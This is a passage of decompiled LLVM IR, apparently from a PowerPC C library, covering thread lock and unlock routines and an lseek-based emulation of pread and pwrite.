dec_label_pc_1001834c:                            ; preds = %dec_label_pc_10018334, %dec_label_pc_10018334.thread, %dec_label_pc_10018394
  %v0_1001834c = load i32, i32* @r29, align 4
  %v1_1001834c = inttoptr i32 %v0_1001834c to i32*
  %v2_1001834c = load i32, i32* %v1_1001834c, align 4
  store i32 %v2_1001834c, i32* %r9.global-to-local, align 4
  %v0_10018350 = load i32, i32* @r30, align 4
  store i32 1, i32* @r11, align 4
  %v3_10018358 = icmp eq i32 %v2_1001834c, 0
  br i1 %v3_10018358, label %dec_label_pc_1001834c.dec_label_pc_10018370_crit_edge, label %dec_label_pc_10018360

dec_label_pc_1001834c.dec_label_pc_10018370_crit_edge: ; preds = %dec_label_pc_1001834c
  %v1_10018374.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10018380

dec_label_pc_10018360:                            ; preds = %dec_label_pc_1001834c
  %v3_10018350 = icmp eq i32 %v0_10018350, 0
  br i1 %v3_10018350, label %dec_label_pc_10018364, label %dec_label_pc_10018368

dec_label_pc_10018364:                            ; preds = %dec_label_pc_10018360
  %v0_10018364 = load i32, i32* @r2, align 4
  store i32 %v0_10018364, i32* @r30, align 4
  br label %dec_label_pc_10018368

dec_label_pc_10018368:                            ; preds = %dec_label_pc_10018360, %dec_label_pc_10018364
  %v0_10018368 = phi i32 [ %v0_10018350, %dec_label_pc_10018360 ], [ %v0_10018364, %dec_label_pc_10018364 ]
  %v1_10018368 = load i32, i32* @r31, align 4
  %v2_10018368 = add i32 %v1_10018368, 4
  %v3_10018368 = inttoptr i32 %v2_10018368 to i32*
  store i32 %v0_10018368, i32* %v3_10018368, align 4
  %v0_1001836c = load i32, i32* @r31, align 4
  store i32 %v0_1001836c, i32* @r11, align 4
  %v0_10018374.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10018380

dec_label_pc_10018380:                            ; preds = %dec_label_pc_10018368, %dec_label_pc_1001834c.dec_label_pc_10018370_crit_edge
  %v1_10018374 = phi i32 [ %v1_10018374.pre, %dec_label_pc_1001834c.dec_label_pc_10018370_crit_edge ], [ %v0_1001836c, %dec_label_pc_10018368 ]
  %v0_10018374 = phi i32 [ 0, %dec_label_pc_1001834c.dec_label_pc_10018370_crit_edge ], [ %v0_10018374.pre, %dec_label_pc_10018368 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10018374 = inttoptr i32 %v1_10018374 to i32*
  store i32 %v0_10018374, i32* %v2_10018374, align 4
  %v0_10018378 = load i32, i32* %r0.global-to-local, align 4
  %v1_10018378 = load i32, i32* @r31, align 4
  %v2_10018378 = add i32 %v1_10018378, 8
  %v3_10018378 = inttoptr i32 %v2_10018378 to i32*
  store i32 %v0_10018378, i32* %v3_10018378, align 4
  %v0_10018384 = load i32, i32* %r9.global-to-local, align 4
  %r0.promoted = load i32, i32* %r0.global-to-local, align 4
  %.pre = xor i32 %r0.promoted, %v0_10018384
  %v5_10018384 = icmp eq i32 %.pre, 0
  br i1 %v5_10018384, label %dec_label_pc_100183a0, label %dec_label_pc_10018394

dec_label_pc_10018394:                            ; preds = %dec_label_pc_10018380
  store i32 %.pre, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001834c

dec_label_pc_100183a0:                            ; preds = %dec_label_pc_10018380
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_100183a0 = icmp eq i32 %v0_10018384, 0
  br i1 %v3_100183a0, label %dec_label_pc_100183f0, label %dec_label_pc_100183a8

dec_label_pc_100183a8:                            ; preds = %dec_label_pc_100183a0
  %v0_100183a8 = load i32, i32* @r28, align 4
  %v0_100183ac = load i32, i32* @r30, align 4
  store i32 268534708, i32* @lr, align 4
  %v2_100183b0 = inttoptr i32 %v0_100183a8 to i32*
  %v3_100183b0 = call i32 @__pthread_timedsuspend_new(i32 %v0_100183ac, i32* %v2_100183b0)
  %v3_100183b4 = icmp eq i32 %v3_100183b0, 0
  br i1 %v3_100183b4, label %dec_label_pc_100183c4, label %dec_label_pc_100183f0

dec_label_pc_100183c4:                            ; preds = %dec_label_pc_100183a8
  %v0_100183bc = load i32, i32* @r31, align 4
  %v1_100183bc = add i32 %v0_100183bc, 8
  store i32 %v1_100183bc, i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %r11.promoted = load i32, i32* @r11, align 4
  %v5_100183c8 = icmp eq i32 %r11.promoted, 0
  br i1 %v5_100183c8, label %dec_label_pc_10018400, label %dec_label_pc_100183e8

dec_label_pc_100183e8:                            ; preds = %dec_label_pc_100183c4
  %v0_100183e8 = load i32, i32* @r30, align 4
  store i32 %v0_100183e8, i32* @r3, align 4
  store i32 268534768, i32* @lr, align 4
  %v0_100183ec = call i32 @suspend.10()
  br label %dec_label_pc_100183f0

dec_label_pc_100183f0:                            ; preds = %dec_label_pc_100183a8, %dec_label_pc_100183a0, %dec_label_pc_100183e8
  %v0_100183f0 = load i32, i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_100183f8.1121 to i32), i32* @lr, align 4
  %v1_100183f4 = inttoptr i32 %v0_100183f0 to i32*
  %v2_100183f4 = call i32 @wait_node_free(i32* %v1_100183f4)
  br label %dec_label_pc_100183fc

dec_label_pc_100183fc:                            ; preds = %dec_label_pc_1001833c, %dec_label_pc_100183f0
  br label %dec_label_pc_10018400

dec_label_pc_10018400:                            ; preds = %dec_label_pc_100183c4, %dec_label_pc_100183fc
  %v0_10018410 = phi i32 [ 0, %dec_label_pc_100183c4 ], [ 1, %dec_label_pc_100183fc ]
  store i32 %v0_100182c8, i32* %r0.global-to-local, align 4
  ret i32 %v0_10018410

; uselistorder directives
  uselistorder i32 %v3_100182f4, { 1, 0, 2, 3 }
  uselistorder i32* %r9.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 9, 10, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 (i32, i32*)* @__pthread_timedsuspend_new, { 1, 0, 2 }
  uselistorder i32 (i32)* @__pthread_acquire, { 1, 0 }
  uselistorder label %dec_label_pc_10018400, { 1, 0 }
  uselistorder label %dec_label_pc_100183fc, { 1, 0 }
  uselistorder label %dec_label_pc_100183f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10018368, { 1, 0 }
  uselistorder label %dec_label_pc_1001834c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001830c, { 1, 0 }
}

define i32 @__pthread_unlock() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10018418 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1001844c

dec_label_pc_10018430:                            ; preds = %dec_label_pc_1001844c
  %.pre = xor i32 %r0.promoted, 1
  %v5_10018434 = icmp eq i32 %.pre, 0
  br i1 %v5_10018434, label %dec_label_pc_1001851c, label %dec_label_pc_1001844c

dec_label_pc_1001844c:                            ; preds = %dec_label_pc_100184b0, %dec_label_pc_10018430, %entry
  %r0.promoted = phi i32 [ %v0_10018418, %entry ], [ %.pre, %dec_label_pc_10018430 ], [ %v1_100184a8, %dec_label_pc_100184b0 ]
  %v0_1001844c = load i32, i32* @r3, align 4
  %v1_1001844c = inttoptr i32 %v0_1001844c to i32*
  %v2_1001844c = load i32, i32* %v1_1001844c, align 4
  store i32 %v2_1001844c, i32* @r10, align 4
  %v3_10018450 = icmp eq i32 %v2_1001844c, 1
  br i1 %v3_10018450, label %dec_label_pc_10018430, label %dec_label_pc_10018458

dec_label_pc_10018458:                            ; preds = %dec_label_pc_1001844c
  %v1_10018458 = call i32 @__asm_rlwinm(i32 %v2_1001844c, i32 0, i32 0, i32 30)
  store i32 %v1_10018458, i32* @r8, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_10018458, i32* %r9.global-to-local, align 4
  %v0_10018468 = load i32, i32* @r3, align 4
  store i32 %v0_10018468, i32* %r7.global-to-local, align 4
  store i32 %v0_10018468, i32* @r11, align 4
  %v3_100184944 = icmp eq i32 %v1_10018458, 0
  br i1 %v3_100184944, label %dec_label_pc_1001849c.thread, label %dec_label_pc_10018474

dec_label_pc_1001849c.thread:                     ; preds = %dec_label_pc_10018458
  br label %dec_label_pc_100184b0

dec_label_pc_10018474:                            ; preds = %dec_label_pc_10018458, %dec_label_pc_10018488.dec_label_pc_10018474_crit_edge
  %v1_10018478 = phi i32 [ %v1_10018478.pre, %dec_label_pc_10018488.dec_label_pc_10018474_crit_edge ], [ 0, %dec_label_pc_10018458 ]
  %v0_10018488 = phi i32 [ %v1_10018490, %dec_label_pc_10018488.dec_label_pc_10018474_crit_edge ], [ %v1_10018458, %dec_label_pc_10018458 ]
  %v1_10018474 = add i32 %v0_10018488, 24
  %v2_10018474 = inttoptr i32 %v1_10018474 to i32*
  %v3_10018474 = load i32, i32* %v2_10018474, align 4
  %v2_10018478 = icmp slt i32 %v3_10018474, %v1_10018478
  br i1 %v2_10018478, label %dec_label_pc_10018488, label %dec_label_pc_10018480

dec_label_pc_10018480:                            ; preds = %dec_label_pc_10018474
  store i32 %v3_10018474, i32* %r6.global-to-local, align 4
  %v0_10018484 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10018484, i32* @r11, align 4
  br label %dec_label_pc_10018488

dec_label_pc_10018488:                            ; preds = %dec_label_pc_10018474, %dec_label_pc_10018480
  %v1_10018488 = add i32 %v0_10018488, 12
  %v2_10018488 = inttoptr i32 %v1_10018488 to i32*
  %v3_10018488 = load i32, i32* %v2_10018488, align 4
  store i32 %v1_10018488, i32* %r7.global-to-local, align 4
  %v1_10018490 = call i32 @__asm_rlwinm(i32 %v3_10018488, i32 0, i32 0, i32 30)
  store i32 %v1_10018490, i32* %r9.global-to-local, align 4
  %v3_10018494 = icmp eq i32 %v1_10018490, 0
  br i1 %v3_10018494, label %dec_label_pc_1001849c, label %dec_label_pc_10018488.dec_label_pc_10018474_crit_edge

dec_label_pc_10018488.dec_label_pc_10018474_crit_edge: ; preds = %dec_label_pc_10018488
  %v1_10018478.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10018474

dec_label_pc_1001849c:                            ; preds = %dec_label_pc_10018488
  %v0_1001849c.pre = load i32, i32* @r11, align 4
  %v1_1001849c.pre = load i32, i32* @r3, align 4
  %v4_1001849c = icmp eq i32 %v0_1001849c.pre, %v1_1001849c.pre
  br i1 %v4_1001849c, label %dec_label_pc_1001849c.dec_label_pc_100184b0_crit_edge, label %dec_label_pc_100184d0

dec_label_pc_1001849c.dec_label_pc_100184b0_crit_edge: ; preds = %dec_label_pc_1001849c
  %v0_100184a4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_100184b0

dec_label_pc_100184b0:                            ; preds = %dec_label_pc_1001849c.dec_label_pc_100184b0_crit_edge, %dec_label_pc_1001849c.thread
  %v0_100184a4 = phi i32 [ %v0_100184a4.pre, %dec_label_pc_1001849c.dec_label_pc_100184b0_crit_edge ], [ 0, %dec_label_pc_1001849c.thread ]
  %v1_100184a4 = add i32 %v0_100184a4, 12
  %v2_100184a4 = inttoptr i32 %v1_100184a4 to i32*
  %v3_100184a4 = load i32, i32* %v2_100184a4, align 4
  %v1_100184a8 = call i32 @__asm_rlwinm(i32 %v3_100184a4, i32 0, i32 0, i32 30)
  %r9.promoted = load i32, i32* %r9.global-to-local, align 4
  %.pre14 = xor i32 %r9.promoted, %v2_1001844c
  %v5_100184b4 = icmp eq i32 %.pre14, 0
  store i32 %.pre14, i32* @r9, align 4
  br i1 %v5_100184b4, label %dec_label_pc_1001850c, label %dec_label_pc_1001844c

dec_label_pc_100184d0:                            ; preds = %dec_label_pc_1001849c
  %v1_100184d0 = inttoptr i32 %v0_1001849c.pre to i32*
  %v2_100184d0 = load i32, i32* %v1_100184d0, align 4
  %v1_100184d4 = call i32 @__asm_rlwinm(i32 %v2_100184d0, i32 0, i32 0, i32 30)
  store i32 %v1_100184d4, i32* @r8, align 4
  %v1_100184d8 = add i32 %v1_100184d4, 12
  %v2_100184d8 = inttoptr i32 %v1_100184d8 to i32*
  %v3_100184d8 = load i32, i32* %v2_100184d8, align 4
  %v1_100184dc = load i32, i32* @r11, align 4
  %v2_100184dc = inttoptr i32 %v1_100184dc to i32*
  store i32 %v3_100184d8, i32* %v2_100184dc, align 4
  br label %dec_label_pc_100184f0

dec_label_pc_100184f0:                            ; preds = %dec_label_pc_100184d0, %dec_label_pc_100184f0
  %v0_100184e4 = load i32, i32* @r3, align 4
  %v1_100184e4 = inttoptr i32 %v0_100184e4 to i32*
  %v2_100184e4 = load i32, i32* %v1_100184e4, align 4
  store i32 %v2_100184e4, i32* %r9.global-to-local, align 4
  %v1_100184ec = call i32 @__asm_rlwinm(i32 %v2_100184e4, i32 0, i32 0, i32 30)
  %r11.promoted = load i32, i32* @r11, align 4
  %.pre15 = xor i32 %r11.promoted, %v2_100184e4
  %v5_100184f4 = icmp eq i32 %.pre15, 0
  store i32 %.pre15, i32* @r11, align 4
  br i1 %v5_100184f4, label %dec_label_pc_1001850c, label %dec_label_pc_100184f0

dec_label_pc_1001850c:                            ; preds = %dec_label_pc_100184b0, %dec_label_pc_100184f0
  %v0_10018510 = load i32, i32* @r8, align 4
  store i32 %v0_10018510, i32* @r3, align 4
  %v2_10018514 = add i32 %v0_10018510, 12
  %v3_10018514 = inttoptr i32 %v2_10018514 to i32*
  store i32 0, i32* %v3_10018514, align 4
  store i32 268535068, i32* @lr, align 4
  %v1_10018518 = call i32 @restart.9(i32 %v0_10018510)
  br label %dec_label_pc_1001851c

dec_label_pc_1001851c:                            ; preds = %dec_label_pc_10018430, %dec_label_pc_1001850c
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10018490, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001851c, { 1, 0 }
  uselistorder label %dec_label_pc_1001850c, { 1, 0 }
  uselistorder label %dec_label_pc_100184f0, { 1, 0 }
  uselistorder label %dec_label_pc_10018488, { 1, 0 }
  uselistorder label %dec_label_pc_10018474, { 1, 0 }
}

define i32 @__pthread_lock() local_unnamed_addr {
entry:
  %v0_1001853c = load i32, i32* @r3, align 4
  store i32 %v0_1001853c, i32* @r30, align 4
  %v0_10018544 = load i32, i32* @r4, align 4
  store i32 %v0_10018544, i32* @r31, align 4
  %v1_10018548 = inttoptr i32 %v0_1001853c to i32*
  %v2_10018548 = load i32, i32* %v1_10018548, align 4
  store i32 %v2_10018548, i32* @r9, align 4
  %v3_1001854c = icmp eq i32 %v2_10018548, 0
  br i1 %v3_1001854c, label %dec_label_pc_10018558, label %dec_label_pc_10018578

dec_label_pc_10018558:                            ; preds = %entry
  %r10.promoted10 = load i32, i32* @r10, align 4
  %v5_1001855c = icmp eq i32 %r10.promoted10, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v5_1001855c, label %dec_label_pc_10018610, label %dec_label_pc_10018578

dec_label_pc_10018578:                            ; preds = %entry, %dec_label_pc_10018558
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_1001857c

dec_label_pc_1001857c:                            ; preds = %dec_label_pc_1001857c.backedge, %dec_label_pc_10018578
  %v0_100185a4.pr = phi i32 [ %v0_100185a4.pr.pre, %dec_label_pc_1001857c.backedge ], [ %v0_10018544, %dec_label_pc_10018578 ]
  %v0_1001857c = phi i32 [ %v0_1001857c.pre, %dec_label_pc_1001857c.backedge ], [ %v0_1001853c, %dec_label_pc_10018578 ]
  %v1_1001857c = inttoptr i32 %v0_1001857c to i32*
  %v2_1001857c = load i32, i32* %v1_1001857c, align 4
  store i32 %v2_1001857c, i32* @r9, align 4
  store i32 1, i32* @r11, align 4
  %v1_10018584 = urem i32 %v2_1001857c, 2
  %v3_10018584 = icmp eq i32 %v1_10018584, 0
  br i1 %v3_10018584, label %dec_label_pc_100185a4, label %dec_label_pc_10018590

dec_label_pc_10018590:                            ; preds = %dec_label_pc_1001857c
  %v3_10018590 = icmp eq i32 %v0_100185a4.pr, 0
  br i1 %v3_10018590, label %dec_label_pc_10018598, label %dec_label_pc_1001859c

dec_label_pc_10018598:                            ; preds = %dec_label_pc_10018590
  %v0_10018598 = load i32, i32* @r2, align 4
  store i32 %v0_10018598, i32* @r31, align 4
  br label %dec_label_pc_1001859c

dec_label_pc_1001859c:                            ; preds = %dec_label_pc_10018590, %dec_label_pc_10018598
  %v0_1001859c = phi i32 [ %v0_100185a4.pr, %dec_label_pc_10018590 ], [ %v0_10018598, %dec_label_pc_10018598 ]
  store i32 0, i32* @r11, align 4
  br label %dec_label_pc_100185a4

dec_label_pc_100185a4:                            ; preds = %dec_label_pc_1001857c, %dec_label_pc_1001859c
  %v1_100185ac = phi i32 [ %v0_1001859c, %dec_label_pc_1001859c ], [ %v0_100185a4.pr, %dec_label_pc_1001857c ]
  %v3_100185a4 = icmp eq i32 %v1_100185ac, 0
  br i1 %v3_100185a4, label %dec_label_pc_100185b4, label %dec_label_pc_100185ac

dec_label_pc_100185ac:                            ; preds = %dec_label_pc_100185a4
  %v2_100185ac = add i32 %v1_100185ac, 12
  %v3_100185ac = inttoptr i32 %v2_100185ac to i32*
  store i32 %v2_1001857c, i32* %v3_100185ac, align 4
  %v0_100185b8.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_100185b4

dec_label_pc_100185b4:                            ; preds = %dec_label_pc_100185a4, %dec_label_pc_100185ac
  %v0_100185b8 = phi i32 [ %v0_100185b8.pre, %dec_label_pc_100185ac ], [ %v2_1001857c, %dec_label_pc_100185a4 ]
  %r10.promoted = load i32, i32* @r10, align 4
  %.pre = xor i32 %r10.promoted, %v0_100185b8
  %v5_100185b8 = icmp eq i32 %.pre, 0
  store i32 %.pre, i32* @r10, align 4
  store i1 false, i1* @cr0_so, align 1
  br i1 %v5_100185b8, label %dec_label_pc_100185d4, label %dec_label_pc_100185c8.dec_label_pc_1001857c.backedge_crit_edge

dec_label_pc_100185c8.dec_label_pc_1001857c.backedge_crit_edge: ; preds = %dec_label_pc_100185b4
  %v0_100185a4.pr.pre.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001857c.backedge

dec_label_pc_1001857c.backedge:                   ; preds = %dec_label_pc_100185dc, %dec_label_pc_100185c8.dec_label_pc_1001857c.backedge_crit_edge
  %v0_100185a4.pr.pre = phi i32 [ %v0_100185a4.pr.pre.pre, %dec_label_pc_100185c8.dec_label_pc_1001857c.backedge_crit_edge ], [ %v0_100185e4, %dec_label_pc_100185dc ]
  %v0_1001857c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001857c

dec_label_pc_100185d4:                            ; preds = %dec_label_pc_100185b4
  %v0_100185d4 = load i32, i32* @r11, align 4
  %v3_100185d4 = icmp eq i32 %v0_100185d4, 0
  br i1 %v3_100185d4, label %dec_label_pc_100185dc.preheader, label %dec_label_pc_100185fc.preheader

dec_label_pc_100185dc.preheader:                  ; preds = %dec_label_pc_100185d4
  %v0_100185dc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100185dc

dec_label_pc_100185fc.preheader:                  ; preds = %dec_label_pc_100185d4
  %v0_100185fc1 = load i32, i32* @r29, align 4
  %v3_100185fc4 = icmp eq i32 %v0_100185fc1, 0
  %v0_100186005 = load i32, i32* @r31, align 4
  store i32 %v0_100186005, i32* @r3, align 4
  %v1_100186047 = add i32 %v0_100185fc1, -1
  store i32 %v1_100186047, i32* @r29, align 4
  br i1 %v3_100185fc4, label %dec_label_pc_10018610, label %dec_label_pc_100185f8

dec_label_pc_100185dc:                            ; preds = %dec_label_pc_100185dc.preheader, %dec_label_pc_100185f0
  %v0_100185dc = phi i32 [ %v0_100185dc.pre, %dec_label_pc_100185dc.preheader ], [ %v0_100185e4, %dec_label_pc_100185f0 ]
  store i32 %v0_100185dc, i32* @r3, align 4
  store i32 268535268, i32* @lr, align 4
  %v0_100185e0 = call i32 @suspend.10()
  %v0_100185e4 = load i32, i32* @r31, align 4
  %v1_100185e4 = add i32 %v0_100185e4, 12
  %v2_100185e4 = inttoptr i32 %v1_100185e4 to i32*
  %v3_100185e4 = load i32, i32* %v2_100185e4, align 4
  %v3_100185e8 = icmp eq i32 %v3_100185e4, 0
  br i1 %v3_100185e8, label %dec_label_pc_1001857c.backedge, label %dec_label_pc_100185f0

dec_label_pc_100185f0:                            ; preds = %dec_label_pc_100185dc
  br label %dec_label_pc_100185dc

dec_label_pc_100185f8:                            ; preds = %dec_label_pc_100185fc.preheader, %dec_label_pc_100185f8
  %v0_100186008 = phi i32 [ %v0_10018600, %dec_label_pc_100185f8 ], [ %v0_100186005, %dec_label_pc_100185fc.preheader ]
  store i32 268535292, i32* @lr, align 4
  %v1_100185f8 = call i32 @restart.9(i32 %v0_100186008)
  %v0_100185fc = load i32, i32* @r29, align 4
  %v3_100185fc = icmp eq i32 %v0_100185fc, 0
  %v0_10018600 = load i32, i32* @r31, align 4
  store i32 %v0_10018600, i32* @r3, align 4
  %v1_10018604 = add i32 %v0_100185fc, -1
  store i32 %v1_10018604, i32* @r29, align 4
  br i1 %v3_100185fc, label %dec_label_pc_10018610, label %dec_label_pc_100185f8

dec_label_pc_10018610:                            ; preds = %dec_label_pc_100185f8, %dec_label_pc_100185fc.preheader, %dec_label_pc_10018558
  %.0 = phi i32 [ undef, %dec_label_pc_10018558 ], [ %v0_100186005, %dec_label_pc_100185fc.preheader ], [ %v0_10018600, %dec_label_pc_100185f8 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_10018600, { 0, 2, 1 }
  uselistorder i32 %v0_100185e4, { 2, 0, 1 }
  uselistorder i32 %v0_100186005, { 1, 0, 2 }
  uselistorder i32 %v2_1001857c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_100185a4.pr, { 2, 0, 1 }
  uselistorder i32 ()* @suspend.10, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100185f8, { 1, 0 }
  uselistorder label %dec_label_pc_100185dc, { 1, 0 }
  uselistorder label %dec_label_pc_100185b4, { 1, 0 }
  uselistorder label %dec_label_pc_100185a4, { 1, 0 }
  uselistorder label %dec_label_pc_1001859c, { 1, 0 }
  uselistorder label %dec_label_pc_10018578, { 1, 0 }
}

define i32 @__fake_pread_write64(i32 %arg1) local_unnamed_addr {
entry:
  %r24.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %v0_10018634 = load i32, i32* @r7, align 4
  store i32 %v0_10018634, i32* %r28.global-to-local, align 4
  %v0_10018648 = load i32, i32* @r8, align 4
  store i32 %v0_10018648, i32* %r29.global-to-local, align 4
  %v0_1001864c = load i32, i32* @r4, align 4
  store i32 %v0_1001864c, i32* %r26.global-to-local, align 4
  %v0_10018650 = load i32, i32* @r9, align 4
  store i32 %v0_10018650, i32* %r24.global-to-local, align 4
  store i32 %arg1, i32* %r27.global-to-local, align 4
  store i32 268535388, i32* @lr, align 4
  %v4_10018658 = call i32 @__libc_lseek64(i32 0, i32 0, i32 1, i32 0)
  store i32 %v4_10018658, i32* %r30.global-to-local, align 4
  %v0_10018660 = load i32, i32* @r4, align 4
  store i32 %v0_10018660, i32* @r31, align 4
  %v3_10018664 = icmp eq i32 %v4_10018658, -1
  br i1 %v3_10018664, label %dec_label_pc_1001866c, label %dec_label_pc_10018674

dec_label_pc_1001866c:                            ; preds = %entry
  %v3_1001866c = icmp eq i32 %v0_10018660, -1
  br i1 %v3_1001866c, label %dec_label_pc_10018708, label %dec_label_pc_10018674

dec_label_pc_10018674:                            ; preds = %entry, %dec_label_pc_1001866c
  %v0_10018674 = load i32, i32* %r28.global-to-local, align 4
  %v0_10018678 = load i32, i32* %r29.global-to-local, align 4
  %v0_1001867c = load i32, i32* %r27.global-to-local, align 4
  store i32 268535432, i32* @lr, align 4
  %v4_10018684 = call i32 @__libc_lseek64(i32 %v0_1001867c, i32 %v0_10018674, i32 %v0_10018678, i32 0)
  %v3_10018688 = icmp eq i32 %v4_10018684, -1
  br i1 %v3_10018688, label %dec_label_pc_10018690, label %dec_label_pc_10018698

dec_label_pc_10018690:                            ; preds = %dec_label_pc_10018674
  %v0_10018690 = load i32, i32* @r4, align 4
  %v3_10018690 = icmp eq i32 %v0_10018690, -1
  br i1 %v3_10018690, label %dec_label_pc_10018708, label %dec_label_pc_10018698

dec_label_pc_10018698:                            ; preds = %dec_label_pc_10018674, %dec_label_pc_10018690
  %v0_10018698 = load i32, i32* %r24.global-to-local, align 4
  %v3_10018698 = icmp eq i32 %v0_10018698, 1
  %v0_100186a8 = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_10018698, label %dec_label_pc_100186a0, label %dec_label_pc_100186b4

dec_label_pc_100186a0:                            ; preds = %dec_label_pc_10018698
  %v0_100186a0 = load i32, i32* %r26.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100186b0.1122 to i32), i32* @lr, align 4
  %v2_100186ac = call i32 @__libc_write(i32 %v0_100186a8, i32 %v0_100186a0)
  br label %dec_label_pc_100186c4

dec_label_pc_100186b4:                            ; preds = %dec_label_pc_10018698
  store i32 268535492, i32* @lr, align 4
  %v1_100186c0 = call i32 @__libc_read(i32 %v0_100186a8)
  br label %dec_label_pc_100186c4

dec_label_pc_100186c4:                            ; preds = %dec_label_pc_100186a0, %dec_label_pc_100186b4
  %storemerge = phi i32 [ %v1_100186c0, %dec_label_pc_100186b4 ], [ %v2_100186ac, %dec_label_pc_100186a0 ]
  store i32 %storemerge, i32* %r28.global-to-local, align 4
  %v0_100186c8 = call i32 @__errno_location()
  store i32 %v0_100186c8, i32* %r29.global-to-local, align 4
  %v0_100186d0 = load i32, i32* @r31, align 4
  %v0_100186d4 = load i32, i32* %r30.global-to-local, align 4
  %v0_100186d8 = load i32, i32* %r27.global-to-local, align 4
  %v1_100186e0 = inttoptr i32 %v0_100186c8 to i32*
  %v2_100186e0 = load i32, i32* %v1_100186e0, align 4
  store i32 %v2_100186e0, i32* @r31, align 4
  store i32 268535528, i32* @lr, align 4
  %v4_100186e4 = call i32 @__libc_lseek64(i32 %v0_100186d8, i32 %v0_100186d4, i32 %v0_100186d0, i32 0)
  %v3_100186e8 = icmp eq i32 %v4_100186e4, -1
  br i1 %v3_100186e8, label %dec_label_pc_100186f0, label %dec_label_pc_10018700

dec_label_pc_100186f0:                            ; preds = %dec_label_pc_100186c4
  %v0_100186f0 = load i32, i32* @r4, align 4
  %v3_100186f0 = icmp eq i32 %v0_100186f0, -1
  br i1 %v3_100186f0, label %dec_label_pc_100186f8, label %dec_label_pc_10018700

dec_label_pc_100186f8:                            ; preds = %dec_label_pc_100186f0
  %v0_100186f8 = load i32, i32* %r28.global-to-local, align 4
  %v3_100186f8 = icmp eq i32 %v0_100186f8, -1
  br i1 %v3_100186f8, label %dec_label_pc_10018700, label %dec_label_pc_10018708

dec_label_pc_10018700:                            ; preds = %dec_label_pc_100186f8, %dec_label_pc_100186f0, %dec_label_pc_100186c4
  %v0_10018700 = load i32, i32* @r31, align 4
  %v1_10018700 = load i32, i32* %r29.global-to-local, align 4
  %v2_10018700 = inttoptr i32 %v1_10018700 to i32*
  store i32 %v0_10018700, i32* %v2_10018700, align 4
  %v0_10018710.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1001870c

dec_label_pc_10018708:                            ; preds = %dec_label_pc_100186f8, %dec_label_pc_10018690, %dec_label_pc_1001866c
  store i32 -1, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1001870c

dec_label_pc_1001870c:                            ; preds = %dec_label_pc_10018700, %dec_label_pc_10018708
  %v0_10018710 = phi i32 [ %v0_10018710.pre, %dec_label_pc_10018700 ], [ -1, %dec_label_pc_10018708 ]
  ret i32 %v0_10018710

; uselistorder directives
  uselistorder i32* %r28.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_1001870c, { 1, 0 }
  uselistorder label %dec_label_pc_100186c4, { 1, 0 }
  uselistorder label %dec_label_pc_10018698, { 1, 0 }
  uselistorder label %dec_label_pc_10018674, { 1, 0 }
}

define i32 @__libc_pwrite64() local_unnamed_addr {
entry:
  store i32 1, i32* @r9, align 4
  %v1_10018728 = call i32 @__fake_pread_write64(i32 1)
  ret i32 %v1_10018728
}

define i32 @__libc_pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 0, i32* @r9, align 4
  %v1_10018730 = call i32 @__fake_pread_write64(i32 0)
  ret i32 %v1_10018730

; uselistorder directives
  uselistorder i32 (i32)* @__fake_pread_write64, { 1, 0 }
}

define i32 @__fake_pread_write(i32 %arg1) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %v0_10018740 = load i32, i32* @r4, align 4
  store i32 %v0_10018740, i32* %r28.global-to-local, align 4
  %v0_10018754 = load i32, i32* @r6, align 4
  store i32 %v0_10018754, i32* @r31, align 4
  %v0_10018758 = load i32, i32* @r7, align 4
  store i32 %v0_10018758, i32* %r30.global-to-local, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 268535652, i32* @lr, align 4
  %v3_10018760 = call i32 @__GI___libc_lseek(i32 0, i32 1, i32 1)
  %v3_10018764 = icmp eq i32 %v3_10018760, -1
  store i32 %v3_10018760, i32* %r26.global-to-local, align 4
  br i1 %v3_10018764, label %dec_label_pc_100187ec, label %dec_label_pc_10018770

